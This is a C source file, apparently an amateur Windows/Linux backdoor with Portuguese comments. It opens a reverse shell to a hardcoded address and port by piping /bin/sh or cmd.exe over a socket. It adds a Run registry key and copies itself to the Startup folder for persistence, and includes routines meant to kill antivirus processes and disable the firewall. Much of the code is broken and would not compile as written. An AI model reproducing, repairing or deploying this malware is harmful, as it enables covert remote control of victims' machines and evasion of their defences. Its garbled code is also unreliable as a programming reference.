#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <X11/Xlib.h>

#define remote_addr "127.0.0.1"

#define remote_port 55766


/* struct of cong=figurations to target. */

  typedef struct client {

  char REMOTE_ADDR;
  int REMOTE_PORT;

/* char cmd[_T_SIZE 256];

  char send[2046]; */

  } Client;

  typedef struct connection_success {

/*
  int sockfd;
  int newsockfd;
  int listenfd; */

  int x;

  } Connection_success;

  x = 1;

  void error (char *err)

 {

  perror(err);
  exit(EXIT_FAILURE);

 } /* exit without exceptions... and keep the routine.


//function  to disable antivirus. */

void kill_antivirus()

  {
     //int i;
     FILE *arq;

    arq = fopen("av.txt", "rb");
    if(arq == 0)
        exit(EXIT_SUCCESS);
    else
        while( (arq=fgetc(arq)) != EOF)
          if (arq = '\n')

   execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
//   send(x,"Killing anti virus...\n",18,0);
   execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);

   return;

}

/* in this, i use a .vbs file, and invoked from execv(); */

void kill_firewall()

  {

   execve("firewall.vbs", 0, 0);

   return;

  }

  // function that auto copy the software into the register of target machine

void auto_copy()

  {

     system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe");
     return;

  }

void copy_to_registry()

  {
    execve("copy /Y meuarquivo.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar",0,0);
    return;
  }


  /*função para o programa rodar em background, como um deamon

   create connection */
  void shell()

  {
    //int x;
    struct sockaddr_in s;

    XFreeCursor;

    pid_t pid;
	pid = fork();

	if(pid < 0 )
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();

        if (pid < 0)
            exit(EXIT_FAILURE);

        if (pid > 0)
            exit(EXIT_SUCCESS);

        umask(0);

        chdir("/, C:\\, C:\\Windows\\System32");

        int k;

        for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--)

        {
            close(k);

    s.sin_family = AF_INET;
    s.sin_addr.s_addr = inet_addr(remote_addr);
    s.sin_port = htons(remote_port);

    x = socket(AF_INET, SOCK_STREAM, 0);

    connect(x, (struct sockaddr *)&s, sizeof(s));

    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
    perror("setsockopt(SO_REUSEADDR) failed");

    send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);

    dup2(x, 0),dup2(x, 1),dup2(x, 2);

    execve("/bin/sh", 0, 0),execve("C:\\Window\\System32\\cmd.exe", 0, 0),execve("netcat", 0, 0);

    return;

   }
}


   /* execute the program */

   int main(int argc, char **argv)

   {
	   
    while(1)

    shell();

    auto_copy();
    copy_to_registry();
    kill_antivirus();
    kill_firewall();

    return;
	   
   }


  /* static const unsigned char *ip;
   static const unsigned long int *port;
   static const unsigned char *cmd;

   static const long unsigned int *newsockfd;
   static const long unsigned int *n;
   static const long unsigned int *listenfd;
   static const long unsigned int *clien;

  listenfd = socket(AF_INET, SOCK_STREAM, 0);

  memset(&serv_addr, '0', sizeof(serv_addr));
  memset(&cmd, '0', sizeof(cmd));

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(ip);
  serv_addr.sin_port = htons(port);

  if (listenfd < 0)
      perror("error 101");

  if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
    perror("setsockopt(SO_REUSEADDR) failed");

  bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

  listen(listenfd, 10);

  printf("about to listen\n");
     listen(listenfd, 10);
     clien = sizeof(serv_addr);

     printf("About to accept\n");

     }
*/
